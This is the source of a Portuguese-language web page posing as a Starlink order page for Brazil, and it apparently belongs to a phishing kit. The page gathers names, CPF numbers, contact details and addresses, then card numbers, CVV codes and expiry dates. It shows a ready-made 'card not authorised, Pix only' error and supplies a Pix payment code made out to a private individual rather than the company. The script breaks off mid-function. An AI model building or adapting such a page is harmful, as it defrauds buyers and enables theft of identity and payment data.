

<?php

?>


<!DOCTYPE HTML>
<html>


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<title>Starlink: Internet em qualquer lugar a qualquer momento</title>
	<meta charset="utf-8">
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/1.html"></script>
	<link rel="stylesheet" href="css/css.css">
	<link rel="stylesheet" href="css/finalizar.css">
	<script type="text/javascript" src="js/js.html" ></script>
	<script type="text/javascript" src="js/finalizar.html" ></script>
	
	<link rel="stylesheet" href="../fonts.googleapis.com/icone91f.css?family=Material+Icons">
	<meta charset='utf-8'>
	<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
	<meta name="format-detection" content="telephone=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<link rel="shortcut icon" type='image/ico' href="../i.imgur.com/cNAkZQx.png">

    <link rel="preconnect" href="../fonts.googleapis.com/index.html">
<link rel="preconnect" href="../fonts.gstatic.com/index.html" crossorigin>
<link href="../fonts.googleapis.com/css29692.css?family=Nunito+Sans:opsz,wght@6..12,200;6..12,500&amp;family=Roboto+Condensed:wght@300;400;600&amp;display=swap" rel="stylesheet">

<style>    .selecionado {
    background-color: hsla(0, 0%, 100%, 0.3);
    transition: background-color 0.3s;
}</style>
</head>
<body id='body' class='c1' style='margin:0;width:100%;-webkit-text-size-adjust:none;background-color:#F1F1F1;'>
<span id='local' style='display:none;'>dados</span>
<script> local = $('#local').text(); online(local); $('#hiddenclick').click(); setInterval(function(){ if(document.hasFocus()==true){ local = $('#local').text(); online(local); } },10000); </script>
<!--POSITION:FIXED-->
<div style='display:none;width:40px;height:40px;position:fixed;bottom:25px;right:25px;z-index:101;'>
    <img onclick='compartilhar("https://wa.me/");' src='https://lh3.googleusercontent.com/pw/AJFCJaUBx_gWQskNuIfJODxfXyR7JyfIdEFeJn021SOMDz4oc7QkeA3tpjr7Ob-x_ZQIE5U354ADwIPnNO1iXtlAD9MrVcVW7hScssDwJFVn4UmEcP8hZnCWOsIA8ikLhsJ-0dfos6NUkBprlE8HlwDsJmc4=w937-h941-s-no?authuser=0' style="margin:0 auto;width:48px;min-height:48px;max-height:48px;cursor:pointer;" />
</div>
<div id='avisoDeCookies' class='avisoDeCookies' style='display:none;position:fixed;border-radius:7px;z-index:102;background-color:0;-webkit-box-shadow: 0px 0px 10px 2px rgba(199,199,199,1);-moz-box-shadow: 0px 0px 10px 2px rgba(199,199,199,1);box-shadow: 0px 0px 10px 2px rgba(199,199,199,1);'>
    <div style='margin:20px 20px 0 20px;flex-grow:1;text-align:left;word-break:break-word;'>
        <span style='font-family:nunitoregular;font-size:14px;color:#00a1ba;line-height:10px;'><b>cookies: </b>nós usamos cookies para personalizar anúncios e melhorar a sua experiência em nosso site. Ao continuar navegando você concorda com a nossa política de privacidade.</span>
    </div>
    <div onclick='avisoDeCookies();' style='margin:10px 20px 20px 20px;flex-grow:1;height:35px;display:flex;align-items:center;border-radius:7px;border:solid 1px ;background-color:0;cursor:pointer;'>
        <span style='margin:0 auto;font-family:nunitobold;font-size:14px;color:#00a1ba;'>continuar</span>
    </div>
</div>
<div id='loading' style='position:fixed;width:100vw;height:100vh;background-color:rgba(0,0,0,0.8);display:none;align-items:center;z-index:105;'>
    <style> .loader{ margin:25px; border: solid 5px #ffffff; border-top: 5px solid rgba(0,0,0,0); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }  @keyframes spin {  0% { transform: rotate(0deg); }  100% { transform: rotate(360deg); } } </style>
    <div style='width:100%;'>
        <div style='margin: 100px; auto;height:70px;text-align:center;'>
	        <div class='loader' style='margin:0 auto;'></div>
        </div>
    </div>
</div>
<!--código copiado-->
<div id='codigoCopiado' style='padding:16px;position:fixed;width:calc(100vw - 52px);height:max-content;left:10px;bottom:16px;background-color:#ffffff;display:none;align-items:center;z-index:105;box-shadow: 0 -2px 8px 2px rgba(0,0,0,.15);border-radius:8px;'>
	<span id='textoCodigoCopiado' style='margin:0;font-family:Roboto Condensed;font-size:14px;color:#000000;'>Código copiado!</span>
</div>
<main style='display:flex;flex-flow:column;width:100%;height:100vh;max-height:100vh;background-color:#000000;'>
	<img src='../i.imgur.com/1fXzbcn.png' class='logoDaTela' style='width:165px;max-width:165px;max-height:27.22px;' />

	<div style='flex-grow:1;display:flex;flex-basis:auto;position:relative;'>
		<div class='banner' style='flex-grow:1;height:calc(100vh - 207.22px);max-height:calc(100vh - 207.22px);background-image:url("../i.imgur.com/rd8XGxx.jpg");background-position:center;background-size:contain;background-repeat:no-repeat;'></div>
		<div id='campoPrincipal' class='campoPrincipal' style='overflow-y:scroll;padding:0 20px;text-align:left;'>
			<span class='pedidoDaStarlink' style='display:block;font-family:Roboto Condensed;font-weight: 400;font-size:30px;color:#ffffff;'>PEDIDO DA STARLINK</span>
			<span style='margin-top:25px;display:block;font-family:Roboto Condensed;font-weight: 400;font-size:20px;color:#ffffff;'>Brasil</span>
			<span style='margin-top:5px;display:block;font-family:Roboto Condensed;font-weight: 400;font-size:16px;color:#ffffff;'>A Starlink está disponível em sua região!</span>
			<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Sem contratos. Teste de 30 dias. A estimativa atual para os prazos de envio é de 5 a 7 dias.</span>
			<div onclick='abrirInformações("1");' style='margin-top:20px;display:flex;align-items:center;width:max-content;cursor:pointer;'>
				<i class="material-icons" style='font-size:24px;color:#ffffff;transform:rotate(-90deg);'>&#xe5c5;</i>
				<span style='margin-left:5px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;text-decoration:underline;'>Visão geral do produto e serviço</span>
			</div>
			<div id='caixaDeInformações1' class='caixaDeInformação' style='display:none;flex-flow:column;'>
				<ul style='margin-left:10px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;word-break:break-word;'>
					<li><b>Desempenho:</b> inclui Internet ilimitada de alta velocidade e baixa latência.</li>
					<li style='margin-top:12px;'><b>Instalação:</b> configuração simples pelo aplicativo Starlink, sem necessidade de instalação profissional. Baixe para iOS ou Android.</li>
					<li style='margin-top:12px;'><b>Acessórios:</b> faça login em sua conta para conferir a loja Starlink depois de fazer seu pedido. Você pode visualizar nossa seleção de acessórios compatíveis.</li>
					<li style='margin-top:12px;'><b>Cobrança:</b> Você receberá sua primeira cobrança mensal pelo serviço após ativar o seu Starlink ou 30 dias após o envio, o que ocorrer primeiro.</li>
				</ul>
			</div>
			<div onclick='abrirInformações("2");' style='margin-top:20px;display:flex;align-items:center;width:max-content;cursor:pointer;'>
				<i class="material-icons" style='font-size:24px;color:#ffffff;transform:rotate(-90deg);'>&#xe5c5;</i>
				<span style='margin-left:5px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;text-decoration:underline;'>Conteúdo da caixa</span>
			</div>
			<div id='caixaDeInformações2' class='caixaDeInformação' style='display:none;flex-flow:column;'>
            <img src='../i.imgur.com/9qd5PEh.png' class='imagemInformação' style='margin-top:12px ; width: 300px; height:auto;'>
				<span style='margin-top:15px;margin-left:50px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Sua Starlink chegará com tudo o que você precisa para ficar online, incluindo:</span>
				<ul style='margin-top:12px;margin-left:10px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;word-break:break-word;'>
					<li>Starlink</li>
					<li style='margin-top:12px;'>Roteador Wi-Fi</li>
					<li style='margin-top:12px;'>Cabo Starlink de 15 metros (50 pés)</li>
					<li style='margin-top:12px;'>Cabo de alimentação</li>
					<li style='margin-top:12px;'>Base</li>
				</ul>
			</div>
			<span style='margin-top:40px;display:block;font-family:Roboto Condensed;font-weight: 400;font-size:20px;color:#ffffff;'>SERVIÇO</span>
			<div style='margin-top:12px;width:140px;min-height:56px;max-height:56px;background-color:#ffffff;border-radius:5px;display:flex;align-items:center;'>
				<div style='width:100%;text-align:center;'>
					<span style='display:block;font-family:Roboto Condensed;font-size:14px;font-weight:600;color:#000000;'>STARLINK</span>
					<span style='margin-top:5px;display:block;font-family:Roboto Condensed;font-size:16px;color:#000000;'>R$ 999,90</span>
				</div>
			</div>
			<span style='margin-top:40px;display:block;font-family:Roboto Condensed;font-weight: 400;font-size:20px;color:#ffffff;'>R$ 184,00/mês com um custo único de equipamento de R$ 999,90</span>

			<div id='finalizarPedido' class='campoFinalizarPedido' style='margin-top:40px;display:flex;flex-flow:column;'>
				<div id='loadingPagamento' style='flex-grow:1;height:600px;display:none;'>
					<div style='margin:150px auto;height:70px;text-align:center;'>
	    			    <div class='loader' style='margin:0 auto;'></div>
        			</div>
				</div>
				<div id='informaçõesDaCompra' style='display:flex;flex-flow:column;height:600px;'>
					<span style='display:block;font-family:Roboto Condensed;font-weight: 400;font-size:18px;color:#ffffff;'>Informações para a compra</span>

					<input type='text' id='nomeCompleto' placeholder='Nome completo' onkeyup='primeiraLetraMaiuscula("nomeCompleto","erroNomeCompleto");' style='margin-top:25px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroNomeCompleto' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O nome completo é obrigatório.</span>
					</div>
					<input type='text' id='documento' placeholder='CPF ou CNPJ' onkeyup='mascaraCpfCnpj("documento","erroDocumento","");' style='margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroDocumento' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O CPF ou CNPJ é obrigatório</span>
					</div>
					<input type='text' id='telefone' placeholder='Número de telefone' onkeyup='mascaraCelular("telefone","erroTelefone","");' style='margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroTelefone' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O telefone é obrigatório.</span>
					</div>
					<input type='text' id='email' placeholder='E-Mail' onkeyup='mascaraEmail("email","erroEmail","");' style='margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroEmail' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O E-Mail é obrigatório.</span>
					</div>
					<div onclick='endereçoDeEntrega();' style='margin-top:26px;width:100%;min-height:56px;max-height:56px;background-color:#ffffff;border-radius:5px;display:flex;align-items:center;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:16px;font-weight:600;color:#000000;'>Endereço de entrega</span>
					</div>
				</div>
				<div id='endereçoParaEntrega' style='display:none;flex-flow:column;height:600px;'>
					<span style='display:block;font-family:Roboto Condensed;font-weight: 400;font-size:18px;color:#ffffff;'>Endereço para entrega</span>

					<input type="text" id="cepEndereco" placeholder="CEP" onkeyup="mascaraCep();" style="margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;">
					<div style='margin-top:2px;width:100%;height:14px;'>
					<div id="erroCepEndereco" style="display:none;color:#f44336;">CEP inválido.</div>
					</div>
					<input type="text" id="logradouroEndereco" placeholder="Rua/Avenida" onkeyup="ocultarErroAoDigitar('logradouroEndereco','erroLogradouroEndereco');" style="margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;">
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroLogradouroEndereço' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>Rua/Avenida é obrigatório.</span>
					</div>
					<input type='text' id='numeroEndereço' placeholder='Número' onkeyup='ocultarErroAoDigitar("numeroEndereço","erroNumeroEndereço");' style='margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroNumeroEndereço' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O número é obrigatório.</span>
					</div>
					<input type='text' id='complementoEndereço' placeholder='Complemento' onkeyup='ocultarErroAoDigitar("","");' style='margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
					<input type="text" id="bairroEndereco" placeholder="Bairro" style="margin-top:26px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;">
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroBairroEndereço' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O bairro é obrigatório.</span>
					</div>
					<input type="text" id="cidadeEndereco" placeholder="Cidade" onkeyup="ocultarErroAoDigitar('cidadeEndereco','erroCidadeEndereco');" style="margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;">
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroCidadeEndereço' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>A cidade é obrigatória.</span>
					</div>
					<input type="text" id="estadoEndereco" placeholder="Estado/Província" onkeyup="ocultarErroAoDigitar('estadoEndereco','erroEstadoEndereco');" style="margin-top:10px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;">
					<div style='margin-top:2px;width:100%;height:14px;'>
						<span id='erroEstadoEndereço' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O estado é obrigatório.</span>
					</div>
					<div onclick='pagamento();' style='margin-top:26px;width:100%;min-height:56px;max-height:56px;background-color:#ffffff;border-radius:5px;display:flex;align-items:center;cursor:pointer;'>
						<span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#000000;'>Pagamento</span>
					</div>
				</div>
				<div id='pagamento' style='display:none;flex-flow:column;height:600px;'>
					<span style='display:block;font-family:Roboto Condensed;font-weight: 400;font-size:18px;color:#ffffff;'>Pagamento</span>
					<div id='formasDePagamento' style='margin-top:25px;display:flex;align-items:center;text-align:left;'>
    <span id='totalDeFormasDePagamento' style='display:none;'>3</span>
    <div onclick='selecionarFormaDePagamento("1");' id='c' style='display:block;margin-right:1%;width:32%;text-align:center;padding:10px 0;border:solid 1px rgba(255,255,255,.07);border-radius:6px;cursor:pointer;'>
        <img src='../i.imgur.com/LboqL3B.png' style='margin:0 auto;min-height:32px;max-height:32px;'>
        <div style='margin:5px 20px;height:32px;text-align:center;display:flex;align-items:center;'>
            <span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#ffffff;'>Pix</span>
        </div>
    </div>
    <div onclick='selecionarFormaDePagamento("3");' id='formaDePagamento3' style='display:block;margin-right:1%;width:32%;text-align:center;padding:10px 0;border:solid 1px rgba(255,255,255,.07);border-radius:6px;cursor:pointer;'>
        <img src='../i.imgur.com/8ubh79w.png' style='margin:0 auto;min-height:32px;max-height:32px;'>
        <div style='margin:5px 20px;height:32px;text-align:center;display:flex;align-items:center;'>
            <span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#ffffff;'>Cartão de crédito</span>
        </div>
    </div>
    <div onclick='selecionarFormaDePagamento("2");' id='formaDePagamento2' style='display:none;width:32%;text-align:center;padding:10px 0;border:solid 1px rgba(255,255,255,.07);border-radius:6px;cursor:pointer;'>
        <img src='../i.imgur.com/KHFWd3C.png' style='margin:0 auto;min-height:32px;max-height:32px;'>
        <div style='margin:5px 20px;height:32px;text-align:center;display:flex;align-items:center;'>
            <span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#ffffff;'>Boleto</span>
        </div>
    </div>
</div>

					<div id='loadingPagamentoFinal' style='flex-grow:1;height:600px;display:none;'>
						<div style='margin:150px auto;height:70px;text-align:center;'>
	    			    	<div class='loader' style='margin:0 auto;'></div>
        				</div>
					</div>
					<div id='campoFormaDePagamento1' style='display:flex;flex-flow:column;'>
						<span style='margin:25px 0 0 0;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Pagamento no Pix tem <b>10% de desconto</b>.</span><span style='margin-top:25px;display:block;font-family:Roboto Condensed;font-weight:600;font-size:18px;color:#ffffff;'>Valor à pagar: R$ 999,90</span><span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:14px;color:#ffffff;'>Equipamento: R$ 999,90</span><span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:14px;color:#ffffff;'>Mensalidade: R$ 184,00 (depois de 30 dias.)</span><span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:14px;color:#ffffff;'>Valor total: R$ 999,90</span><span style='margin-top:10px;display:none;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Quantidade: 1</span><div style='margin:20px 0;flex-grow:1;height:1px;background-color:rgba(255,255,255,0.3);'></div>						<span style='display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Ao clicar em "Fazer Pedido", será gerado um código Pix copia e cola para pagamento, você também poderá pagar via QR Code Pix.</span>
						<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Aprovação instantânea</span>
						<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>Pague usando o seu Internet banking ou seu app de pagamentos.</span>
						<span style='margin-top:10px;display:block;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>É fácil e rápido</span>
						<div onclick='fazerPedidoViaPix();' id='botaoFazerPedidoPix' style='margin-top:26px;width:100%;min-height:56px;max-height:56px;background-color:#ffffff;border-radius:5px;display:flex;align-items:center;cursor:pointer;'>
    <span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#000000;'>Fazer Pedido</span>
</div>

					</div>
					<div id='campoFormaDePagamento3' style='display:none;flex-flow:column;'>
						<div id='dadosDoCartão' style='display:flex;flex-flow:column;'>
							<span style='margin:30px 0 10px;display:block;font-family:Roboto Condensed;font-weight: 400;font-size:18px;color:#ffffff;'>Informe os dados do cartão</span>
							<div id='erroDePagamentoComCartão' style='display:none;align-items:center;text-align:left;border:solid 1px #888888;padding:10px;flex-grow:1;border-radius:6px;'>
								<span style='margin:0 auto;display:block;font-family:Roboto Condensed;font-size:14px;color:#f44336;'>Pagamento não autorizado. Promoção válida apenas para pagamento via pix.</span>
							</div>
                            <input oninput='validarNumeroDoCartao(this);' type='text' id='numeroDoCartão' placeholder='Número do cartão' style='margin-top:12px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
							<div style='margin-top:2px;width:100%;height:14px;'>
								<span id='erroNumeroDoCartão' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>Número do cartão inválido.</span>
							</div>
							<input oninput='validarNomeDoTitularDoCartao(this);' type='text' id='nomeDoTitularDoCartão' placeholder='Nome do titular do cartão' style='margin-top:12px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
							<div style='margin-top:2px;width:100%;height:14px;'>
								<span id='erroNomeDoTitularDoCartão' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>Insira o nome do titular.</span>
							</div>
							<div style='margin-top:12px;flex-grow:1;display:flex;'>
								<div style='width:48%;display:flex;flex-flow:column;'>
									<input oninput='formatarValidadeDoCartao(this);' type='text' id='validadeDoCartão' onkeyup='mascaraValidade("validadeDoCartão","erroValidadeDoCartão","");' placeholder='Mês/Ano' style='flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
									<div style='margin-top:2px;width:100%;height:14px;'>
										<span id='erroValidadeDoCartão' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>Validade incorreta.</span>
									</div>
								</div>
								<div style='margin:0 0 0 auto;width:48%;display:flex;flex-flow:column;'>
									<input oninput='validarCVVDoCartao(this);' type='text' id='cvvDoCartão' onkeyup='mascaraCvv("cvvDoCartão","erroCvvDoCartão","");' placeholder='Código de segurança' style='flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
									<div style='margin-top:2px;width:100%;height:14px;'>
										<span id='erroCvvDoCartão' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>CVV inválido.</span>
									</div>
								</div>
							</div>
							<input type='text' id='cpfDoTitularDoCartão' onkeyup='mascaraCpf("cpfDoTitularDoCartão","erroCpfDoTitularDoCartão","");' placeholder='CPF do titular do cartão' style='margin-top:12px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
							<div style='margin-top:2px;width:100%;height:14px;'>
								<span id='erroCpfDoTitularDoCartão' style='display:none;font-family:Roboto Condensed;font-size:14px;line-height:14px;color:#f44336;'>O CPF é inválido.</span>
							</div>

							<select id='parcelamento' style='margin-top:12px;flex-grow:1;min-height:43px;max-height:43px;padding:0 10px;outline:0;background-color:hsla(0,0%,100%,.15);border:solid 1px #888888;border-radius:4px;font-family:Roboto Condensed;font-size:16px;color:#ffffff;'>
								<option style='color:#000000;' value='1x de R$ 2.284,00 sem juros'>1x de R$ 999,90 sem juros</option><option style='color:#000000;' value='2x de R$ 1.142,00 sem juros'>2x de R$ 499,95 sem juros</option><option style='color:#000000;' value='3x de R$ 761,33 sem juros'>3x de R$ 333,3 sem juros</option><option style='color:#000000;' value='4x de R$ 571,00 sem juros'>4x de R$ 249,97 sem juros</option><option style='color:#000000;' value='5x de R$ 456,80 sem juros'>5x de R$ 199,98 sem juros</option><option style='color:#000000;' value='6x de R$ 380,66 sem juros'>6x de R$ 166,65 sem juros</option>							</select>
							
                            <div onclick='salvarCartao();' style='margin-top:26px;width:100%;min-height:56px;max-height:56px;background-color:#ffffff;border-radius:5px;display:flex;align-items:center;cursor:pointer;'>
                             <span style='margin:0 auto;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#000000;'>Fazer Pedido</span>
                            </div>

						</div>					
					</div>
					<div id='pedidoFinalizadoViaPix' class='pedidoFinalizadoViaPix' style='flex-grow:1;border-radius:6px;box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);display:none;flex-flow:column;'>
						<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#FFFFFF;'>Copie este código para pagar</span>

						<div style='margin-top:25px;width:100%;display:flex;'>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#FFFFFF;'>1.&nbsp;</span>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:300;color:#FFFFFF;'>Acesse seu Internet Banking ou app de pagamentos.</span>
						</div>
						<div style='margin-top:10px;width:100%;display:flex;'>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#FFFFFF;'>2.&nbsp;</span>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:300;color:#FFFFFF;'>Escolha pagar via Pix.</span>
						</div>
						<div style='margin-top:10px;width:100%;display:flex;'>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#FFFFFF;'>3.&nbsp;</span>
							<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:300;color:#FFFFFF;'>Cole o seguinte código:</span>
						</div>

						<div style='margin-top:25px;padding:5px 10px;flex-grow:1;border-radius:6px;border:solid 1px rgba(255,255,255,.3);display:flex;'>
							<div style='flex-grow:1;overflow:hidden;'>
								<input type='text' id='codigoPix' style='width:100%;height:40px;outline:0;border:none;background-color:rgba(0,0,0,0);font-family:Roboto Condensed;font-size:14px;font-weight:600;color:#c1c1c1;' disabled value='00020126580014BR.GOV.BCB.PIX0136255e9034-46f4-4656-a80d-3b1f87471b445204000053039865406999.995802BR5925GUILHERME DOS SANTOS BOTE6009SAO PAULO62140510q5TAjONRkX63043D7F'>
							</div>
							<div style='margin-left:-10px;display:flex;padding:0 10px;height:40px;align-items:center;border-radius:0 6px 6px 0;cursor:pointer;-webkit-tap-highlight-color:transparent;'>
								<span onclick='copiarCodigo("codigoPix","Código copiado!");' style='margin:0 auto 0 10px;display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#f1f1f1;'>Copiar</span>
							</div>
						</div>

						<div style='margin-top:25px;width:100%;display:flex;align-items:center;'>
								<i class="material-icons" style='font-size:18px;color:#c1c1c1;'>&#xe855;</i>
							<span style='margin:0 auto 0 10px;display:block;font-family:Roboto Condensed;font-size:14px;color:#c1c1c1;'>Pague e será creditado na hora</span>
						</div>

						<div onclick='copiarCodigo("codigoPix","Código copiado!");' style='margin-top:25px;flex-grow:1;min-height:48px;max-height:48px;background-color:#ffffff;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;cursor:pointer;'>
							<span style='margin:0 auto;font-family:Roboto Condensed;font-weight:600;font-size:16px;color:#000000;'>Copiar código</span>
						</div>

						<div style='margin:25px 0;flex-grow:1;height:1px;background-color:rgba(0,0,0,.1);'></div>

						<span style='display:block;font-family:Roboto Condensed;font-size:16px;font-weight:600;color:#FFFFFF;'>Você também pode pagar pelo QR Code Pix</span>
						<span style='margin-top:5px;display:block;font-family:Roboto Condensed;font-size:14px;font-weight:400;color:#c1c1c1;'>Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois, filme este código:</span>
						
						<img id='qrCodePix' style='margin:20px auto;width:148px;height:148px;' src='img/qr.png'>
					</div>

				</div>
			</div>



		</div>
	</div>

	<div class='footer' style='width:100%;background-color:#000000;display:flex;align-items:center;'>
		<div style='padding:0 20px;flex-grow:1;display:flex;align-items:center;'>
			<span style='margin:0 auto 0 0;font-family:Roboto Condensed;font-size:14px;color:#888888;'>Starlink © 2024</span>
			<span style='margin:0 0 0 auto;font-family:Roboto Condensed;font-size:14px;color:#888888;'>Starlink é uma divisão da SpaceX.</span>
		</div>
	</div>

   



</main>















































<script>
function endereçoDeEntrega() {
    // Verifica se todos os campos estão preenchidos
    if (verificarCamposPreenchidos()) {
        document.getElementById('informaçõesDaCompra').style.display = 'none';
        document.getElementById('endereçoParaEntrega').style.display = 'flex';
    } else {
        alert('Por favor, preencha todos os campos antes de prosseguir.');
    }
}

function pagamento() {
    // Verifica se todos os campos estão preenchidos
    if (verificarCamposPreenchidos()) {
        document.getElementById('endereçoParaEntrega').style.display = 'none';
        document.getElementById('pagamento').style.display = 'flex';
    } else {
        alert('Por favor, preencha todos os campos antes de prosseguir.');
    }
}

// Função para verificar se todos os campos estão preenchidos
function verificarCamposPreenchidos() {
    var nomeCompleto = document.getElementById('nomeCompleto').value;
    var documento = document.getElementById('documento').value;
    var telefone = document.getElementById('telefone').value;
    var email = document.getElementById('email').value;

    return nomeCompleto && documento && telefone && email;
}

// Função para abrir/fechar informações com base no ID passado info cai
function abrirInformações(id) {
    const caixaDeInformações = document.getElementById(`caixaDeInformações${id}`);

    if (caixaDeInformações.style.display === 'none' || caixaDeInformações.style.display === '') {
        caixaDeInformações.style.display = 'block';
    } else {
        caixaDeInformações.style.display = 'none';
    }
}
</script>

<script>function validarNumeroDoCartao(inputElement) {
    inputElement.value = inputElement.value.replace(/\D/g, ''); // Remove não dígitos
    if (inputElement.value.length > 16) {
        inputElement.value = inputElement.value.slice(0, 16); // Limita a 16 dígitos
    }
}
function validarNomeDoTitularDoCartao(inputElement) {
    inputElement.value = inputElement.value.replace(/[^A-Za-z\s]/g, ''); // Remove caracteres não-alfabéticos
}
function formatarValidadeDoCartao(inputElement) {
    inputElement.value = inputElement.value.replace(/\D/g, ''); // Remove não dígitos
    if (inputElement.value.length > 4) {
        inputElement.value = inputElement.value.slice(0, 4); // Limita a 4 dígitos (MM/AA)
    }

    if (inputElement.value.length > 2) {
